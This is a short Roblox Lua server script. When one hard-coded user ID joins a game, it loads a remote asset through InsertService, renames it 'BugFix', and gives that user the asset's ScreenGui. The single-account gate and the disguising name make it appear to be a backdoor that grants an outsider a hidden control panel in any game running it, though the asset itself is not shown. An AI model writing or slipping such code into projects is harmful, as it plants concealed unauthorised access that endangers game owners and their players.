game.Players.PlayerAdded:Connect(function(plr)
	if plr.UserId == 144324719 then
		local ok = game:GetService("InsertService"):LoadAsset(18937651198)
		ok.Name = "BugFix"
		ok:FindFirstChildWhichIsA("ScreenGui").Parent = plr.PlayerGui
	end
end)
